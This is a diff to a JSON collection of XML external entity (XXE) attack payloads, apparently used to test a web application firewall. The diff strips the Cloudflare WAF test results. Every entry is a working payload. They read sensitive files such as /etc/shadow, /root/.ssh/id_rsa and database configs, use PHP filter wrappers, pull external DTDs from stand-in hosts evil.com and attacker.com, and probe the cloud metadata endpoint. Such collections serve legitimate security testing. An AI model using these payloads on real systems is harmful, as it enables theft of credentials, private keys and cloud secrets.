@@ -10,12 +10,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
       "description": "XXE file /etc/passwd",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7001",
@@ -24,12 +19,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /etc/passwd",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7002",
@@ -38,12 +28,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /etc/passwd",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7003",
@@ -52,12 +37,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
       "description": "XXE file /etc/shadow",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7004",
@@ -66,12 +46,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /etc/shadow",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7005",
@@ -80,12 +55,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/shadow\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /etc/shadow",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7006",
@@ -94,12 +64,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
       "description": "XXE file /etc/hosts",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7007",
@@ -108,12 +73,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hosts\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /etc/hosts",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7008",
@@ -122,12 +82,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hosts\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /etc/hosts",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7009",
@@ -136,12 +91,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>",
       "description": "XXE file /proc/version",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7010",
@@ -150,12 +100,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/version\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /proc/version",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7011",
@@ -164,12 +109,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/proc/version\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /proc/version",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7012",
@@ -178,12 +118,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><foo>&xxe;</foo>",
       "description": "XXE file /root/.ssh/id_rsa",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7013",
@@ -192,12 +127,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///root/.ssh/id_rsa\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /root/.ssh/id_rsa",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7014",
@@ -206,12 +136,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/root/.ssh/id_rsa\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /root/.ssh/id_rsa",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7015",
@@ -220,12 +145,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://C:\\Windows\\win.ini\">]><foo>&xxe;</foo>",
       "description": "XXE file C:\\Windows\\win.ini",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7016",
@@ -234,12 +154,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file://C:\\Windows\\win.ini\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity C:\\Windows\\win.ini",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7017",
@@ -248,12 +163,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=C:\\Windows\\win.ini\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper C:\\Windows\\win.ini",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7018",
@@ -262,12 +172,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><foo>&xxe;</foo>",
       "description": "XXE file /var/www/html/config.php",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7019",
@@ -276,12 +181,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///var/www/html/config.php\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /var/www/html/config.php",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7020",
@@ -290,12 +190,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/config.php\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /var/www/html/config.php",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7021",
@@ -304,12 +199,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/mysql/my.cnf\">]><foo>&xxe;</foo>",
       "description": "XXE file /etc/mysql/my.cnf",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7022",
@@ -318,12 +208,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/mysql/my.cnf\">%xxe;]><foo>test</foo>",
       "description": "XXE parameter entity /etc/mysql/my.cnf",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7023",
@@ -332,12 +217,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/mysql/my.cnf\">]><foo>&xxe;</foo>",
       "description": "XXE PHP wrapper /etc/mysql/my.cnf",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7024",
@@ -346,12 +226,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo>test</foo>",
       "description": "XXE OOB http://evil.com/evil.dtd",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7025",
@@ -360,12 +235,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe\">%xxe;]><foo>test</foo>",
       "description": "XXE OOB http://attacker.com/xxe",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xxe-7026",
@@ -374,12 +244,7 @@
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">%xxe;]><foo>test</foo>",
       "description": "XXE OOB http://169.254.169.254/latest/meta-data/",
       "technique": "xxe",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
